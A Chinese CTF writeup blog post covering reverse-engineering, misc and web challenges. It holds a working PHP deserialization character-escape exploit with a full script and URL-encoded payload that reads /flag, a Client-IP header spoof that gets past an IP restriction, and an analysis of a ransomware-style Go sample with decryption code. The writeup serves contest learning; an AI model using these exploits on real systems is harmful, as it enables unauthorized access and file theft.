+++
categories = ['题解']
tags = ['Misc', 'Reverse', 'Web']
title = 'LZCTF - Writeup'
slug = 'LZCTF-wp'
date = 2024-12-16T08:55:27+08:00
lastmod = 2024-12-16T08:55:27+08:00
draft = false
+++

纯纯的原题杯，只有原题。

题目难度两极分化，不是一眼大水题就是难得跟史一样。

出了10道misc10道Crypto12道PWN然后re只有可怜巴巴的三道，一道开进去都不用看就知道干什么了另外两道难的看wp都写不出来，写re纯纯的就是坐牢，一点体验感没有。题目这种出法还要算课程成绩呢，按题目数给分的话直接0分算了，也难怪没人学re。

建议这比赛别办了，趁早解散。

打CTF的见一个劝退一个。

本来都是原题不想发的wp写都写了干脆发出来得了。

复现参考的wp原链接会标在题目下。

（本文开始尝试JSDMirror进行CDN加速，旧的图片不再进行修改）

# RC4

观察主要的加密函数，发现特征数256，显然这是一个RC4加密

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image002.png)

因为本题是明文串在程序中直接加密输出密文串，因此我们在加密函数后打一个断点查看加密后的密文即可获得flag。

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image004.png)

双击str找到flag

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image006.png)

# ZIP

用wireshark打开数据包，导出http对象，发现flag.zip

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image008.png)

选中该包，右键media type字段导出分组字节流

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image010.png)

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image012.png)

解压时发现存在密码，我们观察数据的最后几个字节

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image014.png)

发现`ChunQiu\d{4}`这几个字节很有可能是一个掩码，于是用这个掩码进行爆破

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image016.png)

成功解压获得flag

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image018.png)

# 禁止访问

页面显示**403**，查看源代码发现只允许ip为192.168.*.*访问，

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image020.png)

用burpsuite抓包，在报头中添加`Client-IP: 192.168.0.1`字段，发送请求后在响应中收到flag

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image022.png)

 

# Ezphp



~~我又不是学web的我为什么要写这个~~

参考wp：[蓝桥杯CTF-ezphp-Wirteup | TWe1v3](https://twe1v3.top/2023/06/蓝桥杯CTF-ezphp-Wirteup/)，作者**TWe1v3**

[蓝桥杯 2023 | 📕 WriteUp](https://writeup.owo.show/lan-qiao-bei-2023#ezphp)，作者**K1sARa**

网页源码底部存在提示`header ?`，

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image024.png)

bp抓包看一下

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image026.png)

得到网站源码`admin3ecr3t.php`

``` php
<?php

highlight_file(__FILE__);

error_reporting(0);

class A{

  public $key;

  public function readflag(){

     if($this->key === "\0key\0"){

       readfile('/flag');

     }

  }

}

class B{

  public function  __toString(){

     return ($this->b)();

  }

}

class C{

  public $s;

  public $str;

  public function  __construct($s){

     $this->s = $s;

  }

  public function  __destruct(){

     echo $this->str;

  }

}

 

$ser = serialize(new C($_GET['c']));

$data = str_ireplace("\0","00",$ser);

unserialize($data);

?>

```

读取flag的函数在Class A中，满足条件`key==="\0key\0"`即可读取flag文件中的内容，

 

class B和class C中存在三个魔术方法分别是:

- `__construct()`当一个对象创建时被调用

- `__destruct()`当一个对象销毁时被调用

- `__toString()`当一个对象被当作一个字符串使用

PHP反序列化思路如下：

1. 创建一个 `$key` 对象，该对象的类是 A，并将 `$key` 对象的 key 属性设置为` \0key\0`。
2. 创建一个名为 `$f` 的数组，该数组包含两个元素。第一个元素是对 `$key` 对象进行序列化和反序列化后得到的新对象，第二个元素是字符串 `'readflag'`。
3. 创建一个 `$reflection` 对象，该对象的类是 B，并将 `$reflection` 对象的 b 属性设置为 `$f`

反序列化代码：

 ``` php
<?php

class A {

  public $key;

  public function readflag() {

     if ($this->key === "\0key\0") {

       readfile('/flag');

     }

  }

}

 

class B {

  public $b;

  public function __toString() {

     return ($this->b)();

  }

}

 

class C {

  public $s;

  public $str;

  public function __construct($s) {

     $this->s = $s;

  }

  public function __destruct() {

     echo $this->str;

  }

}

 

$key = new A();

$key->key = "\0key\0";

$f = array(unserialize(serialize($key)), 'readflag');

$reflection=new B();

$reflection->b=$f;
 ```


接着我们需要bypass `strstr_ireplace("\0","00",$ser)`，

题目中只能通过 c 进行传值，因此需要通过题目提供的 str_ireplace() 函数进行字符逃逸给 str 赋值以下内容`";s:3:"str";O:1:"B":1:{s:1:"b";a:2:{i:0;O:1:"A":1:{s:3:"key";s:5:"key";}i:1;s:8:"readflag";}}}`

可以发现 `s:5:"key";`匹配不上，结果需要是 `\0key\0` ，又因为现在序列化用的是双引号，PHP 使用单引号时 `\0` 无法被转义，因此需要使用 `str_ireplace('00', "\0", $str)` 进行替换，并且在序列化中 s 不能识别十六进制字符，因此需要将 s 改为 S 。

 

在题目有还有一个 `str_ireplace("\0","00",$ser)`; 会将`\0` 变成 `00` ，因此需要给 key 的值加上反斜杠 `\`

 ``` php
 str_ireplace('00', "\0", '";s:3:"str";O:1:"B":1:{s:1:"b";a:2:{i:0;O:1:"A":1:{s:3:"key";S:5:"\00key\00";}i:1;s:8:"readflag";}}}');
 
 //O:1:"C":2:{s:1:"s";s:197:"1";s:3:"str";O:1:"B":1:{s:1:"b";a:2:{i:0;O:1:"A":1:{s:3:"key";S:5:"\key\";}i:1;s:8:"readflag";}}}";s:3:"str";N;}
 ```

因此逃逸的字符有 96 个，即

 ```php
 ";s:3:"str";O:1:"B":1:{s:1:"b";a:2:{i:0;O:1:"A":1:{s:3:"key";S:5:"\key\";}i:1;s:8:"readflag";}}}
 ```

接下来就是进行字符逃逸，先通过 `str_repeat("\0", 96)` 进行尝试得到的结果如下： 

（192 个 0）

``` php
O:1:"C":2:{s:1:"s";s:194:"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";s:3:"str";O:1:"B":1:{s:1:"b";a:2:{i:0;O:1:"A":1:{s:3:"key";S:5:"\00key\00";}i:1;s:8:"readflag";}}}";s:3:"str";N;}
```

不足以逃逸就继续向上增，增到 98 时发现正好足够：

（196 个 0）

``` php
O:1:"C":2:{s:1:"s";s:196:"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";s:3:"str";O:1:"B":1:{s:1:"b";a:2:{i:0;O:1:"A":1:{s:3:"key";S:5:"\00key\00";}i:1;s:8:"readflag";}}}";s:3:"str";N;}
```

这时候就已经逃逸成功了，通过 urlencode() 就可以得到 payload

```
%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%22%3Bs%3A3%3A%22str%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A1%3A%22b%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A3%3A%22key%22%3BS%3A5%3A%22%5C%00key%5C%00%22%3B%7Di%3A1%3Bs%3A8%3A%22readflag%22%3B%7D%7D%7D
```

exp：

 ``` php

<?php

class A {

  public $key;

  public function readflag() {

    if ($this->key === "\0key\0") {

      readfile('/flag');

    }

  var_dump("abc");

  }

}

 

class B {

 public $b;

  public function __toString() {

    return ($this->b)();

  }

}

 

class C {

  public $s;

  public $str;

  public function __construct($s) {

    $this->s = $s;

  }

  public function __destruct() {

    echo $this->str;

  }

}

 

$key = new A();

$key->key = "\\\0key\\\0";

$f = array(unserialize(serialize($key)), 'readflag');

$reflection=new B();

$reflection->b=$f;

$payload_str = '";s:3:"str";' . serialize($reflection) . ';}';

$obj_len = strlen($payload_str);

$add_str = "";

for ($i=0;$i<$obj_len;$i++) $add_str = $add_str . "\0";

echo urlencode("1" . $add_str . str_replace('key";s:7:', 'key";S:5:', $payload_str));、

?>
 ```


将exp序列化后传入参数c

 

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image028.png)

 

获得flag

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image030.png)

 

 

 

# Simple_re

查看IDA

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image032.png)

代码逻辑是输入一个长度为36的字符串，先进行base64编码，再进行异或加密（每个字符异或20），最后转为十六进制串进行比较。

加密均为可逆操作，只需将密文十六进制串转为字符串，异或解密后base64解码即可

 

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image034.png)

# tmaze

参考wp:

[2024长城杯初赛RE(部分题目) | Sh4d0w](https://sh4d0w.life/article/40058453-a58d-4b57-bd2d-c64afc3a5028#313f5c36a8d848f785370b1333098fbf)

根据标题，猜测是一个T型迷宫，

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image036.png)

操作序列由命令行读入，长度为42

 

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image038.png)

`unk_140037000`中是若干1和0组成的数组，猜测是构成迷宫的参数，`dword_140037FA0`是固定参数10

 

`sub_140001230`是复杂的迷宫生成函数，因此暂时不做分析。

 

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image040.png)

 

`qword_140039200`，`qword_1400391F0`，`qword_1400391F8`分别存储了一个地址。

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image042.png)

为了方便调试，这里改名为`data0`,`data1`和`data2`

 

 

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image044.png)

 

根据最后的if判断语句和switch逻辑，可以知道`data1`指向的地址是会发生变化的

`v7`的地址就是`data2`存的地址

那么，可以分析出来，`data1`其实就是当前操作对应地址，最开始的的`data1`就是`start_loc`，`data2`就是最后的地址`end_loc`

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image046.png)

 

以`’z’`操作为例：

 

都是对地址操作，`v15`就是`now_loc`，`v19`存储的是`(now_loc + 16)`这个地址的值，而这个值恰好又是一个地址，可以说`v19` 是 `next_loc`。要满足不去执行`goto`的操作，需要让if里的条件为假，满足：`next ≠ 0`、`*(now_loc + 26) = 0`

 

根据输入全跟地址相关，以及地址操作全在下半段

就可以考虑不管上半迷宫生成的逻辑

用idapython，把`start_loc`到`end_loc`的内容当作迷宫，根据switch-case的限制逻辑，利用深度搜索算法来输出符合条件的xyz，即path。用递归算法实现深度搜索，记录已经访问过的地址(相当于迷宫中已经走过的坐标)为all_visited_loc，来实现减少搜索量

 ``` python
start_loc = 0x1DDFFDAEA60
end_loc = 0x1DDFFDAEE20


def DFS(now_loc, all_visited_loc, path):
    if now_loc == end_loc:
        if len(path) == 42:
            print("yes! Found the path", end='')
            for i in path:
                print(i, end='')
            return
        else:
            return

    if now_loc in all_visited_loc:
        return
    all_visited_loc.append(now_loc)

    # 开始深度搜索
    # case 'x'
    ifx = get_qword(now_loc)
    xfalse = get_wide_byte(now_loc + 24)
    # case 'y'
    ify = get_qword(now_loc + 8)
    yfalse = get_wide_byte(now_loc + 25)
    # case 'z'
    ifz = get_qword(now_loc + 16)
    zfalse = get_wide_byte(now_loc + 26)

    if (ifx > 0) and (xfalse == 0):
        path.append('x')
        DFS(ifx, all_visited_loc, path)
        path.pop()

    if (ify > 0) and (yfalse == 0):
        path.append('y')
        DFS(ify, all_visited_loc, path)
        path.pop()

    if (ifz > 0) and (zfalse == 0):
        path.append('z')
        DFS(ifz, all_visited_loc, path)
        path.pop()

    all_visited_loc.pop()
    return


all_visited_loc = []
path = []
DFS(start_loc, all_visited_loc, path)
 ```


解出flag：

![img](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image048.png)

 

# xiran_encrypto       

参考wp:

[长城杯2024 xiran_encrypto | z221x-Blog](https://www.z221x.website/article/page-20)

该题为正常ctf题与恶意脚本相结合的题目，cha为常规的re题目，clickme为恶意样本，在cha中拿到信息，然后根据clickme的逻辑解密

Clickme是完全保留符号的go程序。main.mian 里面注册了个遍历文件的回调函数func1，在func1里面调用encrypt_file加密文件

![notion image](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image050.png)

encrypt_file加密文件会先调用curve25519.ScalarBaseMult根据私钥scalar得出公钥dst，scalar是一个随机的32字节，然后在调用curve25519.ScalarMult算出v27。然后进行文件重命名改后缀。

![notion image](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image052.png)

然后将v27拿出来，两次sha256分别作为chacha20的key跟nonce。

![notion image](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image054.png)

在之后根据文件大小加密文件，如果文件小于0x1400000字节就加密全部的字节

![notion image](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image056.png)

如果文件大于0x1400000字节就分块加密，0xa00000为一块，加密前0x100000字节

![notion image](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image058.png)

最后把公钥dst与一个6字节写在文件末尾。所以现在我们就可以根据文件获取到dst，但是现在还未知scalar。

![notion image](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image060.png)

![notion image](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image062.png)

 

cha文件是一个完完全全没有任何符号的函数，而且在init_array里面还有两处反调试。但是其实分析起来也不难。start如下，简单的改下符号名。在init_array里面又很多函数，但是感觉大部分都是静态库函数，而且没有对main函数数据有修改的地方，只是有两处反调试。

![notion image](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image064.png)

第一处反调试在sub_40512D→sub_4050AD(1, 0xFFFF)→sub_40515,exit，ptrace是我修改的符号。

![notion image](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image066.png)

还有在sub_40512D→sub_4051E0，其实这里应该不算是反调试，但是会退出调试时记得过掉。

![notion image](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image068.png)

然后就可以调试了，其实可以调试发现这部分init也就是打印了一个字符串。

然后来分析main函数，简单的恢复一下符号，打印ok是调试得到的

![notion image](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image070.png)

第一步对一个全局变量的32字节做了一个简单的hash然后进行验证是否等于0xD033A96A。

![notion image](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image072.png)

check函数里面对输入进行了换盒的base64编码，然后再把编码后的数据跟原文异或验证。我们现在就是要根据这个异或来获得buf的真正内容。没办法只能爆破，但是这个爆破有技巧的，可以遍历异或box然后判断异或出来的原文是否符合box的index。

![notion image](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image074.png)

 

exp：

``` c
#include<stdio.h>
#include<string.h>
int cmp(unsigned char *tmp, int index,int i)
{
	int ret=0;
	switch (index)
	{
	case 0:
		ret=((tmp[0] >> 2) & 0x3f) == i;
		break;
	case 1:
		ret=(((tmp[0] << 4) | (tmp[1] >> 4)) & 0x3f) == i;
		break;
	case 2:
		ret = (((tmp[1] << 2) | (tmp[2] >> 6)) & 0x3f) == i;
		break;
	case 3:
		ret = (tmp[2] & 0x3f) == i;
		break;
	}
	return ret;
}
unsigned char box[] = { "APet8BQfu9CRgv+DShw/ETixFUjyGVkzHWl0IXm1JYn2KZo3Lap4Mbq5Ncr6Ods7" };
void rebase64(int index, unsigned char* v, unsigned char* tmp, int index_1) {
	if (index >= 43) {
		
		for (int i = 0; i < 44; i++)
		{
			printf("%x ", tmp[i]);
		}
		printf("\n");
		return;
	}
	if (index % 4 == 0 && index !=0)
	{
		index_1 = index_1+3;
	}
	for (int i = 0; i < 64; i++)
	{
		tmp[index] = v[index] ^ box[i];
		if (cmp(tmp + index_1, (index % 4), i)) {
			rebase64(index + 1, v, tmp, index_1);
		}
	}
}
int main()
{
	unsigned char v[] =
	{
	  0xD9, 0x40, 0x6F, 0xCA, 0x3D, 0x8F, 0x53, 0xB1, 0x8B, 0x34,
	  0x92, 0x8E, 0xF7, 0x19, 0x94, 0x61, 0x68, 0x71, 0x55, 0xB6,
	  0xCE, 0x5B, 0x71, 0x1A, 0x79, 0x42, 0x9D, 0x02, 0x93, 0x38,
	  0xAD, 0x1F, 0xD3, 0x24, 0x48, 0xFF, 0x21, 0xA2, 0x24, 0xBE,
	  0x95, 0x3A, 0xC1, 0xD2
	};
	unsigned char tmp[100];
	int index = 0;
	int index_1 = 0;
	rebase64(index, v, tmp, index_1);
	unsigned char m[] = { 0x90,0x10,0x2e,0xa5,0x64,0xe6,0x7c,0xdc,0xf1,0x42,0xa6,0xef,0xa4,0x77,0xed,0x52,0x31,0x17,0x2f,0xec,0x8b,0x6b,0x49,0x62,0x2b,0x31,0xed,0x50,0xf9,0x75,0xf5,0x73 };
	unsigned int sum = 0;
	for (int i = 0; i <= 31; ++i)
		sum = 19 * sum + m[i];
	printf("%x", sum);
}

```

跑出来是多解的，这里我是按照44个字节爆破的，但是原文是32字节，我们可以根据32后的字节是否跟前面字节是否相等判断，当然也可以验证题目hash。

![notion image](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image076.png)

这里获取到的scalar是


``` c
unsigned char m[] = { 0x90,0x10,0x2e,0xa5,0x64,0xe6,0x7c,0xdc,0xf1,0x42,0xa6,0xef,0xa4,0x77,0xed,0x52,0x31,0x17,0x2f,0xec,0x8b,0x6b,0x49,0x62,0x2b,0x31,0xed,0x50,0xf9,0x75,0xf5,0x73 };
```


然后根据dst与scalar写一下解密。

``` go
package main

import (
	"crypto/sha256"
	"fmt"
	"io"
	"log"
	"os"

	"golang.org/x/crypto/chacha20"
	"golang.org/x/crypto/curve25519"
)

func main() {
	// 假设的标量值
	scalar := [32]byte{0x90, 0x10, 0x2e, 0xa5, 0x64, 0xe6, 0x7c, 0xdc, 0xf1, 0x42, 0xa6, 0xef, 0xa4, 0x77, 0xed, 0x52, 0x31, 0x17, 0x2f, 0xec, 0x8b, 0x6b, 0x49, 0x62, 0x2b, 0x31, 0xed, 0x50, 0xf9, 0x75, 0xf5, 0x73}
	publicKey := [32]byte{
		0x34, 0x5B, 0xEB, 0x9B, 0xCC, 0x66, 0xAE, 0xB8, 0x4C, 0xFD, 0x5B, 0xD1, 0x52, 0x32, 0x48, 0x75,
		0x0F, 0x3B, 0xFA, 0x8A, 0x87, 0x9A, 0x08, 0xB9, 0x8D, 0xD9, 0xE3, 0x88, 0x7C, 0x95, 0x65, 0x14}

	result1 := [32]byte{}
	result2 := [32]byte{}
	curve25519.ScalarMult(&result2, &scalar, &publicKey)
	fmt.Printf("%x\n", result2)
	key := sha256.Sum256(result2[:])

	data := sha256.Sum256(key[:])

	inputFile, err := os.Open("flag.png.xiran")
	if err != nil {
		log.Fatal(err)
	}
	defer inputFile.Close()

	// 创建加密后的输出文件
	outputFile, err := os.Create("encrypted_flag.png")
	if err != nil {
		log.Fatal(err)
	}
	defer outputFile.Close()
	c, err := chacha20.NewUnauthenticatedCipher(key[:], data[10:22])
	if err != nil {
		panic(err)
	}
	length := 0x64a5a8a
	sum := 0
	for sum*0xa00000 < length {
		buffer := make([]byte, 0xa00000)
		n, err := inputFile.ReadAt(buffer, (int64)(sum*0xa00000))
		if err != nil && err != io.EOF {
			log.Fatal(err)
		}
		c.XORKeyStream(buffer[:0x100000], buffer[:0x100000])
		if _, err := outputFile.WriteAt(buffer[:n], (int64)(sum*0xa00000)); err != nil {
			log.Fatal(err)
		}
		if err == io.EOF {
			break
		}
		sum = sum + 1
	}
	log.Println("解密完成")
}
```

这道题有个陷阱就是clickme里面给你了公钥，你很有可能会使用这个公钥来加密，而且这个公钥跟使用scalar通过curve25519.ScalarBaseMult计算出来是一样的。

得到png

![notion image](https://cdn.jsdmirror.com/gh/Satori5ama/Figurebed@main/img/LZCTF%20-%20Writeup.assets/clip_image078.png)



